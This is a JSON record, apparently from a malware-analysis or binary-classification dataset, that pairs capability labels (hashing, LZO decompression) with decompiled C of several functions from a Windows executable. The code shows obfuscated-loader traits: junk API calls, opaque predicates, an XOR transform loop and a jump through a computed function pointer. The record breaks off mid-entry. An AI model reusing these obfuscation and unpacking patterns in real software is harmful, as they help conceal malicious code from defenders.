{
    "0042c000": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0042c03b)\n// WARNING: Removing unreachable block (ram,0x0042c040)\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nint32_t __cdecl fcn.0042c000(uint32_t *arg_8h, int32_t *arg_ch, uint32_t arg_10h, int32_t *arg_14h, int32_t arg_18h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint extraout_EDX;\n    int32_t *piVar6;\n    uint8_t in_AF;\n    uint8_t uVar7;\n    uint8_t in_TF;\n    uint8_t uVar8;\n    uint8_t in_IF;\n    uint8_t uVar9;\n    uint8_t in_NT;\n    uint8_t uVar10;\n    uint8_t in_AC;\n    uint8_t uVar11;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t uVar12;\n    uint8_t in_ID;\n    uint8_t uVar13;\n    uint8_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint lpBuffer;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    // [05] -r-x section size 16384 named bxkpahva\n    *0x42a03a = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    *0x429eda = (*_sym.imp.KERNEL32.dll_HeapAlloc)\n                          (*0x42a03a, 8, 0x154, 0, 0, 3, 1, 0, \n                           (in_NT & 1) * 0x4000 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 | (arg_8h < 0) * 0x80 |\n                           (arg_8h == NULL) * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(arg_8h & 0xff) & 1U) == 0) * 4 |\n                           (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n                           (in_AC & 1) * 0x40000);\n    *0x42a1f6 = (*_sym.imp.KERNEL32.dll_CreateFileW)(0x429f9a, 0x80000000);\n    uVar17 = 0x42a28e;\n    (*_sym.imp.GDI32.dll_CreateRectRgnIndirect)();\n    uVar10 = (uVar17 & 0x4000) != 0;\n    uVar9 = (uVar17 & 0x200) != 0;\n    uVar8 = (uVar17 & 0x100) != 0;\n    uVar7 = (uVar17 & 0x10) != 0;\n    uVar13 = (uVar17 & 0x200000) != 0;\n    uVar11 = (uVar17 & 0x40000) != 0;\n    uVar12 = 0;\n    *0x42a336 = arg_14h & var_ch;\n    if ((*0x429f6a != -0x6f14da4c) && (0x3573a2d5 < *0x42a2ce)) {\n        *0x42a336 = (*0x42a336 ^ 0x28d1383e) - *0x429f4e;\n    }\n    *0x42a13e = 0;\n    (*_sym.imp.GDI32.dll_DeleteObject)(var_4h);\n    *0x42a12a = *0x42a13e;\n    *0x42a3a2 = *0x42a336;\n    (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(0x429f06, *0x429eda, 0x154);\n    uVar5 = *0x42a12a;\n    piVar6 = arg_14h;\n    do {\n        uVar16 = *arg_8h;\n        *0x42a072 = arg_ch;\n        *0x42a346 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        arg_ch = *0x42a072;\n        *0x429fc6 = uVar5;\n        **0x42a072 = (uVar16 ^ 0x38e2a8b3) + *piVar6 + arg_10h;\n        piVar6 = piVar6 + *0x42a1ea;\n        *0x42a0ce = arg_ch;\n        var_14h = arg_10h - uVar16 & 0xa01d0fc8;\n        *0x42a1f2 = (uVar5 + 1) - arg_18h;\n        uVar17 = ((uVar17 & 0x400) != 0) * 0x400 | (uVar9 & 1) * 0x200;\n        uVar16 = uVar17 | (uVar8 & 1) * 0x100;\n        uVar15 = uVar16 | (*0x42a1f2 < 0) * 0x80;\n        uVar2 = (*0x42a1f2 == 0) * 0x40;\n        uVar17 = (((uVar10 & 1) * 0x4000 & 0x4000) != 0) * 0x4000 | ((uVar17 & 0x400) != 0) * 0x400 |\n                 ((uVar16 & 0x200) != 0) * 0x200 | ((uVar15 & 0x100) != 0) * 0x100 |\n                 (((uVar15 | uVar2) & 0x80) != 0) * 0x80 | ((uVar2 & 0x40) != 0) * 0x40 |\n                 (((uVar7 & 1) * '\\x10' & 0x10) != 0) * 0x10 |\n                 ((((uVar13 & 1) * 0x200000 | (uVar12 & 1) * 0x100000) & 0x200000) != 0) * 0x200000 |\n                 (((uVar11 & 1) * 0x40000 & 0x40000) != 0) * 0x40000;\n        *0x429ede = arg_10h;\n        *0x42a0ca = arg_8h;\n        if ((*0x42a0f2 < 0x3367d3ce) && (*0x429efe == -0x55c66b2a)) {\n            (*_sym.imp.ODBC32.dll_SQLSetDescFieldW)(0xa8eb0e6, piVar6, 0x5dc0d9b3);\n            uVar4 = (*_sym.imp.ODBC32.dll_SQLNumParams)(0x6191464b, extraout_EDX);\n            (*_sym.imp.ODBC32.dll_SQLSpecialColumns)(uVar4, 0x5f1881d7, 0x7fcf1255);\n        }\n        arg_8h = *0x42a0ca;\n        *0x42a05a = *0x429ede;\n        *0x429f82 = *0x42a1f2;\n        uVar17 = ((uVar17 & 0x4000) != 0) * 0x4000 | ((uVar17 & 0x400) != 0) * 0x400 | ((uVar17 & 0x200) != 0) * 0x200 |\n                 ((uVar17 & 0x100) != 0) * 0x100 | ((uVar17 & 0x80) != 0) * 0x80 | ((uVar17 & 0x40) != 0) * 0x40 |\n                 ((uVar17 & 0x10) != 0) * 0x10 | ((uVar17 & 0x200000) != 0) * 0x200000 |\n                 ((uVar17 & 0x40000) != 0) * 0x40000;\n        *0x42a372 = uVar5 + 1;\n        uVar16 = *0x42a346;\n        uVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x42a346, 8, 0x81);\n        uVar5 = *0x42a05a;\n        *0x42a35a = *0x429f82;\n        uVar15 = 0x429f16;\n        (*_sym.imp.GDI32.dll_CreateRectRgnIndirect)\n                  (0x429f16, \n                   ((uVar16 & 0x4000) != 0) * 0x4000 | ((uVar16 & 0x800) != 0) * 0x800 | ((uVar16 & 0x400) != 0) * 0x400\n                   | ((uVar16 & 0x200) != 0) * 0x200 | ((uVar16 & 0x100) != 0) * 0x100 | ((uVar16 & 0x80) != 0) * 0x80 |\n                   ((uVar16 & 0x40) != 0) * 0x40 | ((uVar16 & 0x10) != 0) * 0x10 | ((uVar16 & 4) != 0) * 4 |\n                   (uVar16 & 1) != 0 | ((uVar16 & 0x200000) != 0) * 0x200000 | ((uVar16 & 0x40000) != 0) * 0x40000);\n        uVar10 = (uVar15 & 0x4000) != 0;\n        uVar9 = (uVar15 & 0x200) != 0;\n        uVar8 = (uVar15 & 0x100) != 0;\n        uVar7 = (uVar15 & 0x10) != 0;\n        uVar14 = (uVar15 & 0x200000) != 0;\n        uVar11 = (uVar15 & 0x40000) != 0;\n        uVar13 = 0;\n        uVar12 = 0;\n        *0x42a1c6 = *0x42a372;\n        if ((uVar15 & 0x40) != 0) {\n            *0x42a1c6 = 0;\n            *0x429f92 = uVar5;\n            var_14h = var_14h - arg_14h;\n            piVar6 = arg_14h;\n        }\n        arg_8h = arg_8h + 1;\n        piVar1 = var_14h ^ *0x42a1c6;\n        *0x42a37a = uVar5;\n        *0x429fd6 = *0x42a35a;\n        (*_sym.imp.KERNEL32.dll_GetTempPathA)(0x81, uVar4);\n        uVar16 = *0x42a37a;\n        uVar5 = *0x42a1c6;\n        arg_ch = arg_ch + 1;\n        *0x429eba = *0x429fd6;\n        (*_sym.imp.KERNEL32.dll_SetFilePointer)(*0x42a0ae, 0x381c, 0, 1);\n        *0x429ff2 = uVar16;\n        (*_sym.imp.USER32.dll_InvalidateRect)(*0x42a322, 0x42a09a, 1);\n        iVar3 = *0x429eba;\n        if ((((*0x42a272 < 0x3a42bea4) && (-0x45d40ba7 < *0x429f32)) && (piVar6 == NULL)) && (uVar5 != 0)) {\n            *0x42a2a2 = *0x42a2a2 + -0x672eac18;\n        }\n        arg_10h = *0x429ff2 - 1;\n        *0x42a2a2 = -*0x42a2a2;\n        *0x42a15e = *0x42a39a;\n        (*_sym.imp.GDI32.dll_DeleteObject)\n                  (var_24h, (uVar10 & 1) * 0x4000 | SBORROW4(*0x429ff2, 1) * 0x800 | ((uVar15 & 0x400) != 0) * 0x400 |\n                            (uVar9 & 1) * 0x200 | (uVar8 & 1) * 0x100 | (arg_10h < 0) * 0x80 | (arg_10h == 0) * 0x40 |\n                            (uVar7 & 1) * 0x10 | ((POPCOUNT(arg_10h & 0xff) & 1U) == 0) * 4 | piVar1 < arg_ch |\n                            (uVar14 & 1) * 0x200000 | (uVar13 & 1) * 0x100000 | (uVar12 & 1) * 0x80000 |\n                            (uVar11 & 1) * 0x40000);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x42a346, 0, uVar4);\n        uVar10 = (uVar17 & 0x4000) != 0;\n        uVar9 = (uVar17 & 0x200) != 0;\n        uVar8 = (uVar17 & 0x100) != 0;\n        uVar7 = (uVar17 & 0x10) != 0;\n        uVar13 = (uVar17 & 0x200000) != 0;\n        uVar11 = (uVar17 & 0x40000) != 0;\n        uVar12 = 0;\n    } while ((uVar17 & 0x40) == 0);\n    *0x429f7a = iVar3;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x42a03a, 0, *0x429eda);\n    return *0x429f7a;\n}\n",
        "token_count": 3569
    },
    "0042c4bb": {
        "rules": [
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n\nuint __cdecl fcn.0042c4bb(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    code *pcVar3;\n    code *pcVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    int32_t extraout_ECX_01;\n    uint32_t extraout_ECX_02;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint extraout_EDX_01;\n    uint extraout_EDX_02;\n    uint extraout_EDX_03;\n    uint extraout_EDX_04;\n    uint extraout_EDX_05;\n    uint extraout_EDX_06;\n    uint extraout_EDX_07;\n    uint extraout_EDX_08;\n    uint extraout_EDX_09;\n    uint extraout_EDX_10;\n    int32_t unaff_EBX;\n    code *pcVar7;\n    uint32_t uVar8;\n    uint32_t unaff_EDI;\n    code *pcVar9;\n    bool bVar10;\n    ulong uVar11;\n    code *pcVar12;\n    uint arg_18h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint32_t var_18h;\n    uint var_14h;\n    code *lpExistingFileName;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x42a282 = *0x42a282 >> 3;\n    *0x42a0aa = unaff_EDI;\n    uVar5 = *0x429efa;\n    *0x42a396 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    pcVar4 = fcn.0042cf01(uVar5);\n    iVar1 = *0x429ec2;\n    uVar11 = CONCAT44(*0x429ec2, pcVar4);\n    *0x42a282 = -*0x42a282;\n    lpExistingFileName = pcVar4 + -0x6d00bea;\n    uVar8 = extraout_ECX;\n    if (*0x42a286 < -0x654a8380) {\n        uVar8 = (var_18h | 0x18b28cd) & pcVar4;\n        if (-1 < uVar8) {\n            uVar5 = (*_sym.imp.IASHLPR.dll_DllUnregisterServer)\n                              (lpExistingFileName, lpExistingFileName, 0xb0c5d51a, pcVar4);\n            (*_sym.imp.CATSRVPS.dll_DllGetClassObject_2)(uVar5, uVar5);\n            (*_sym.imp.ODBC32.dll_SQLConnectW)(0x9da50265, extraout_EDX, extraout_EDX, 0xc24f4012);\n            (*_sym.imp.ODBC32.dll_SQLDescribeParam)(0xb41051c0, extraout_EDX_00, uVar8, 0x91d0d712, *0x42a282);\n            (*_sym.imp.IMAGEHLP.dll_SymGetSymFromAddr)(lpExistingFileName, extraout_EDX_01);\n            lpExistingFileName = lpExistingFileName | uVar8;\n            (*_sym.imp.KERNEL32.dll_MoveFileExW)(lpExistingFileName);\n            (*_sym.imp.ODBC32.dll_SQLGetStmtAttr)(*0x42a282, extraout_EDX_02, lpExistingFileName);\n            uVar11 = (*_sym.imp.ODDBSE32.dll_ConfigDSNW)(0x81c70213, 0, *0x42a282);\n            *0x42a282 = *0x42a282 + -(uVar11 >> 0x20);\n            (*_sym.imp.DSSENH.dll_CPImportKey)(*0x42a282, 0x1b2ec66e, uVar11, *0x42a282, uVar11, 0x9ef3f829);\n            (*_sym.imp.KERNEL32.dll_EnumResourceLanguagesW)(0xa809b0e1, uVar8);\n            uVar5 = (*_sym.imp.CATSRVPS.dll_DllUnregisterServer_1)(0x5633c044, 0x2cda11e4);\n            (*_sym.imp.ODBC32.dll_SQLFreeConnect)(0xbe0457b9, 0x2b77562f, *0x42a282, 0x61188314, uVar5);\n            uVar5 = (*_sym.imp.IASHLPR.dll_MemAllocIas)(0, 0x9be1e9fa, *0x429f3a);\n            (*_sym.imp.ODBC32.dll_SQLEndTran)(0x5f9b37d, 0x1b3ae3ae, 0xa3d6018d, 0, uVar5, 0xb6abc4fe);\n            uVar2 = *0x42a116;\n            uVar5 = extraout_EDX_03;\n            if ((*0x42a1de < 0x7b687992) && (*0x42a17a < 0x602a261b)) {\n                lpExistingFileName = -lpExistingFileName;\n                uVar5 = (*_sym.imp.CATSRVPS.dll_DllRegisterServer_1)(*0x42a116, 0x243542f1, 0xfc97ba2d);\n                (*_sym.imp.NTSHRUI.dll_DllCanUnloadNow)(*0x42a282, 0xd0cb3c8d, lpExistingFileName, uVar5);\n                *0x429f3a = *0x429f3a >> 3;\n                (*_sym.imp.NTSHRUI.dll_IsPathSharedW)(0x32a294d3);\n                uVar8 = uVar8 ^ *0x42a0c6;\n                uVar5 = extraout_EDX_04;\n                unaff_EDI = uVar2;\n            }\n            uVar11 = (*_sym.imp.ODBC32.dll_SQLDriverConnectA)(0xfb435bb2, 0xe11e4c75, uVar5);\n            unaff_EBX = var_18h + uVar11;\n            (*_sym.imp.ODBC32.dll_SQLGetCursorName)(0xa9cf0df8, unaff_EDI, *0x42a282, uVar11 >> 0x20);\n            (*_sym.imp.ODBC32.dll_SQLGetConnectAttrW)(0xb66bb67c, lpExistingFileName, 0xacd57e3d);\n            uVar5 = (*_sym.imp.USER32.dll_DdeUnaccessData)(0x8c4f6a3, *0x429f3a, 0x84227c0d, extraout_EDX_05);\n            uVar5 = (*_sym.imp.IMAGEHLP.dll_UpdateDebugInfoFileEx)(0x16879b56, uVar5, *0x42a282);\n            (*_sym.imp.DSSENH.dll_CPGetHashParam)(uVar5, 0x338ba2b9, 0xbfab4f9a, 0xe239e1d0);\n            uVar11 = (*_sym.imp.IASHLPR.dll_ShutdownIas)\n                               (extraout_EDX_06, *0x42a282, 0x9dd5df47, 0xeecda19c, 0x70f23b36, extraout_EDX_06);\n        }\n        uVar11 = (*_sym.imp.DSSENH.dll_CPDecrypt)(unaff_EBX, uVar11 >> 0x20, uVar11);\n        uVar5 = (*_sym.imp.IMAGEHLP.dll_SymCleanup)(0xe292bdf2, uVar11 >> 0x20, uVar11);\n        (*_sym.imp.ODBC32.dll_SQLGetDescRecW)(uVar5, 0xb84054a4, 0x16485280, 0xef3f2c19);\n        (*_sym.imp.DSSENH.dll_CPDuplicateHash)\n                  (unaff_EBX, 0x57be85c6, lpExistingFileName, *0x429f3a, 0x7a367b47, 0xd219611d);\n        (*_sym.imp.DSSENH.dll_CPDeriveKey)\n                  (0x7311fcc3, unaff_EBX, extraout_EDX_07, 0xb1bd3e74, extraout_EDX_07, extraout_EDX_07);\n        (*_sym.imp.DSSENH.dll_CPEncrypt)\n                  (lpExistingFileName, *0x42a282, 0xa10100c2, unaff_EDI, extraout_EDX_08, *0x429f26);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameW)\n                  (lpExistingFileName, lpExistingFileName, 0x499ff9c4, lpExistingFileName);\n        uVar5 = (*_sym.imp.USER32.dll_GetDesktopWindow)(0x4b9bc891, lpExistingFileName, 0xd0aea71c);\n        *0x429f26 = *0x429f26 >> 5;\n        (*_sym.imp.ODBC32.dll_SQLColAttributeW)(lpExistingFileName, uVar5, uVar5, uVar5);\n        (*_sym.imp.ODBC32.dll_SQLSetStmtOption)\n                  (0x6bc10b27, 0x29f5abf4, extraout_EDX_09, extraout_EDX_09, 0x5bd9bf31, extraout_EDX_09);\n        uVar11 = (*_sym.imp.IASHLPR.dll_DoRequest)(extraout_EDX_10, 0x89bcde33);\n        (*_sym.imp.NTSHRUI.dll_SetFolderPermissionsForSharing)\n                  (uVar11 >> 0x20, 0xabdfc871, uVar8 | 0x7713cec, uVar8 | 0x7713cec, uVar11);\n        uVar8 = extraout_ECX_00;\n    }\n    *0x42a02a = pcVar4;\n    *0x42a096 = uVar8;\n    uVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x42a396, 8, 0x1f2, *0x429fee);\n    (*_sym.imp.KERNEL32.dll_CreateFileW)(0x42a2d6, 0x40000000, 0x40, 0, 3, 0x20, 0);\n    *0x42a10e = uVar5;\n    (*_sym.imp.KERNEL32.dll_InterlockedExchange)(0x42a33a);\n    uVar8 = *0x42a096;\n    if (*0x42a2be < 0x76dea8cd) {\n        *0x42a332 = *0x42a332 + *0x42a02a;\n    }\n    *0x42a092 = *0x42a02a;\n    arg_18h = 0xf9;\n    uVar5 = *0x42a10e;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(*0x42a10e, 0xf9, *0x429efa, iVar1);\n    *0x429f3a = *0x42a092 + *0x429f3a;\n    *0x42a332 = *0x42a332 + (uVar8 ^ *0x42a0ce);\n    uVar8 = *0x42a1da >> 2;\n    pcVar9 = unaff_EDI & var_18h;\n    bVar10 = SCARRY4(*0x42a332, uVar8);\n    *0x42a332 = *0x42a332 + uVar8;\n    if (*0x42a332 != NULL && bVar10 == *0x42a332 < 0) {\n        pcVar9 = pcVar9 + *0x42a092;\n        *0x42a282 = *0x42a282 ^ pcVar9;\n    }\n    pcVar7 = *0x42a282;\n    *0x429f26 = *0x429f26 - pcVar9;\n    pcVar12 = *0x42a092;\n    iVar6 = fcn.0042c000(*0x42a092, *0x42a092, uVar8, uVar5, arg_18h);\n    *0x429f26 = *0x429f26 + iVar6;\n    *0x429eea = extraout_ECX_01;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x42a396, 0, *0x42a10e, 0x42b000);\n    pcVar7 = 0xefa41532 - pcVar7;\n    *0x429f3a = *0x429f3a + 1;\n    if (-0x7a35f9b7 < *0x42a13a) {\n        *0x42a0ee = -*0x42a0ee;\n        *0x42a282 = *0x42a282 + *0x429eea;\n        pcVar3 = *0x42a282;\n        if (((*0x429eb2 < 0xbe5c39aa) && (*0x42a282 = *0x42a282 + -pcVar9,  pcVar7 = pcVar4,  pcVar3 < pcVar9)) &&\n           (bVar10 = pcVar9 <= *0x42a282,  *0x42a282 = *0x42a282 + -pcVar9,  bVar10 && *0x42a282 != NULL)) {\n            *0x42a136 = *0x42a136 | 0x2e145f3c;\n        }\n        *0x429f3a = *0x429f3a + *0x42a112;\n        pcVar7 = (pcVar7 & var_18h) - pcVar12;\n    }\n    *0x429f7e = &stack0xfffffffc + *0x429eaa;\n    *0x42a282 = *0x42a282 | pcVar7 - iVar1;\n    *0x429f26 = *0x429f26 + 1;\n    *0x429f3a = *0x429f3a - pcVar12;\n    *0x42a332 = *0x42a332 + 0x1893ed5f;\n    *0x42a1e6 = pcVar12;\n    (*pcVar12)(pcVar12 + *0x429ef2, 0x42a392, 0x42a1a6, *0x42a036, *0x42a2aa, arg_8h, *0x429f7e);\n    *0x42a366 = *0x42a366 | extraout_ECX_02;\n    return 0;\n}\n",
        "token_count": 3407
    },
    "0042e5dd": {
        "rules": [
            "hash data using aphash/0253f481fbfe42f6972c4d360912dc99"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0042e5dd(uint32_t *arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    uint extraout_EDX;\n    uint32_t extraout_EDX_00;\n    uint32_t uVar4;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint32_t uVar5;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x429eae = unaff_EDI;\n    *0x42a2d2 = unaff_ESI;\n    *0x42a176 = (*_sym.imp.KERNEL32.dll_GetEnvironmentStringsA)();\n    uVar2 = 0;\n    while( true ) {\n        uVar4 = *0x42a032;\n        uVar5 = -(*0x429efa + -0x5b221d48);\n        *0x42a3ae = arg_ch + *0x42a0c6;\n        *0x42a132 = uVar2;\n        if ((0x1f8c11d4 < *0x429f4e) && (*0x42a056 < 0x2cb6594d)) {\n            uVar1 = (*_sym.imp.ODBC32.dll_PostODBCError)(*0x42a3ae, 0x5d2755d8, uVar2, *0x42a3ae, uVar2);\n            (*_sym.imp.DSSENH.dll_CPHashData)(*0x42a026, 0x900b988d, uVar1, uVar1, 0x735e8a92, 0xa24faa9a);\n            (*_sym.imp.ODBC32.dll_SQLAllocHandle)(*0x42a026, extraout_EDX);\n            *0x42a026 = *0x42a026 + uVar5;\n            uVar5 = uVar5 | extraout_EDX_00;\n            uVar4 = uVar4 + 1;\n            uVar2 = extraout_ECX;\n        }\n        uVar3 = *0x42a132;\n        if (arg_8h <= *0x42a3ae) break;\n        if (0x3efc5303 < *0x42a2b6) {\n            if (arg_8h == (uVar5 + uVar2 & *0x42a3aa)) {\n                *0x42a026 = *0x42a026 | arg_8h;\n            }\n            *0x42a026 = *0x42a026 - *0x42a132;\n        }\n        uVar2 = *0x42a132 + 1;\n        arg_8h = arg_8h + -1;\n    }\n    *0x42a262 = *0x42a3ae;\n    (*_sym.imp.KERNEL32.dll_FreeEnvironmentStringsA)(*0x42a176);\n    if ((((arg_8h == uVar5 + uVar2) && (uVar4 == uVar3)) && (0x2f1dac0 < *0x429f4a)) && (-0x151ff4c6 < *0x42a326)) {\n        *0x42a026 = *0x42a026 + 1;\n    }\n    uVar2 = *arg_8h;\n    *0x42a026 = *0x42a026 >> 4;\n    for (; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *0x42a02e = -*0x42a02e;\n        uVar2 = uVar2 >> 8;\n        *0x42a026 = *0x42a026 | uVar3;\n    }\n    return uVar2;\n}\n",
        "token_count": 909
    },
    "null": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __fastcall entry0(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint in_EAX;\n    uint uVar3;\n    uint uVar4;\n    int32_t unaff_EBX;\n    uint unaff_ESI;\n    uint32_t unaff_EDI;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t uVar5;\n    uint arg_8h;\n    uint32_t uVar6;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint hMenu;\n    uint lpBuffer;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar5 = (in_NT & 1) * 0x4000 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 | (unaff_EDI + 0x64a5be61 < 0) * 0x80 |\n            (unaff_EDI == 0x9b5a419f) * 0x40 | (in_AF & 1) * 0x10 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 |\n            (in_AC & 1) * 0x40000;\n    *0x42a04e = in_EAX;\n    *0x42a1d2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    *0x42a36e = *0x42a04e;\n    uVar5 = ((uVar5 & 0x4000) != 0) * 0x4000 | ((uVar5 & 0x400) != 0) * 0x400 | ((uVar5 & 0x200) != 0) * 0x200 |\n            ((uVar5 & 0x100) != 0) * 0x100 | ((uVar5 & 0x80) != 0) * 0x80 | ((uVar5 & 0x40) != 0) * 0x40 |\n            ((uVar5 & 0x10) != 0) * 0x10 | ((uVar5 & 0x200000) != 0) * 0x200000 | ((uVar5 & 0x40000) != 0) * 0x40000;\n    *0x42a39e = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    *0x42a142 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    if ((uVar5 & 0x40) == 0) {\n        param_2 = var_4h;\n        var_8h = unaff_EBX;\n    }\n    uVar1 = *0x42a312 + 0xeb3ebb4d;\n    *0x42a036 = unaff_EBX;\n    *0x42a052 = param_2;\n    uVar6 = *0x42a142;\n    uVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)\n                      (*0x42a142, 8, 0x130, \n                       ((uVar5 & 0x4000) != 0) * 0x4000 | SBORROW4(*0x42a312, 0x14c144b3) * 0x800 |\n                       ((uVar5 & 0x400) != 0) * 0x400 | ((uVar5 & 0x200) != 0) * 0x200 | ((uVar5 & 0x100) != 0) * 0x100\n                       | (uVar1 < 0) * 0x80 | (uVar1 == 0) * 0x40 | ((uVar5 & 0x10) != 0) * 0x10 |\n                       ((POPCOUNT(uVar1 & 0xff) & 1U) == 0) * 4 | *0x42a312 < 0x14c144b3 |\n                       ((uVar5 & 0x200000) != 0) * 0x200000 | ((uVar5 & 0x40000) != 0) * 0x40000);\n    *0x429fca = (*_sym.imp.KERNEL32.dll_HeapAlloc)\n                          (*0x42a1d2, 8, 0x1c5, *0x42a39e, 8, 0x12e, \n                           ((uVar6 & 0x4000) != 0) * 0x4000 | ((uVar6 & 0x800) != 0) * 0x800 |\n                           ((uVar6 & 0x400) != 0) * 0x400 | ((uVar6 & 0x200) != 0) * 0x200 |\n                           ((uVar6 & 0x100) != 0) * 0x100 | ((uVar6 & 0x80) != 0) * 0x80 | ((uVar6 & 0x40) != 0) * 0x40\n                           | ((uVar6 & 0x10) != 0) * 0x10 | ((uVar6 & 4) != 0) * 4 | (uVar6 & 1) != 0 |\n                           ((uVar6 & 0x200000) != 0) * 0x200000 | ((uVar6 & 0x40000) != 0) * 0x40000);\n    uVar5 = 0x42a276;\n    (*_sym.imp.GDI32.dll_CreateDCW)(0x42a276, 0x42a0f6, 0, 0);\n    *0x42a07e = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n    if (((uVar5 & 0x40) == 0) && (*0x429ef6 != 0xa66c1344)) {\n        var_8h = -var_8h;\n        unaff_EBX = 0x7328e3d0;\n    }\n    *0x42a2aa = unaff_ESI;\n    (*_sym.imp.KERNEL32.dll_SetFilePointer)(*0x42a1ee, 0xb6b1, 0, 2, 0x12e);\n    (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(0x429f52, *0x42a07e);\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(uVar3, 0x98);\n    iVar2 = *0x429f6e;\n    *0x42a2ca = -*0x42a2ca;\n    *0x42a2ca = *0x42a2ca & 0xe24ed56f;\n    (*_sym.imp.USER32.dll_GetWindowTextW)(*0x42a0d6, *0x429fca, 0xe2);\n    arg_8h = *0x429f02;\n    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    if ((0x2954d29f < *0x42a3a6) && (*0x429ed2 < -0x242d70a2)) {\n        (*_sym.imp.DSSENH.dll_CPSetHashParam)(unaff_EBX + unaff_EDI, 0xdfc1a7be, 0x64281971, iVar2);\n        (*_sym.imp.DSSENH.dll_CPDuplicateKey)(var_8h, 0x946e247e, 0xbd0cf1a1, unaff_EDI, unaff_EDI);\n        (*_sym.imp.ODBC32.dll_SQLPrepare)(0x4fe43aa9, *0x42a2ca, 0xef250adf);\n        uVar4 = (*_sym.imp.USER32.dll_IsMenu)(0x8972e29, *0x42a2ca, unaff_EDI);\n        (*_sym.imp.DSSENH.dll_DllRegisterServer)(0xad0a5159, uVar4, *0x42a2ca, *0x42a2ca, 0x45b3b7cb, iVar2 - unaff_EDI)\n        ;\n        unaff_EDI = (unaff_EDI ^ *0x429ef6) - *0x42a152;\n    }\n    *0x429f42 = fcn.0042e176(arg_8h);\n    *0x42a2ca = *0x42a2ca ^ unaff_EDI;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x42a142, 0, uVar3, *0x429fca);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x42a1d2, 0);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(*0x42a39e, 0, *0x42a07e);\n    return *0x429f42;\n}\n",
        "token_count": 2169
    },
    "0042d1c7": {
        "rules": [
            "hash data using aphash/d4672a7c2b8d413ab72f7529ccc05031"
        ],
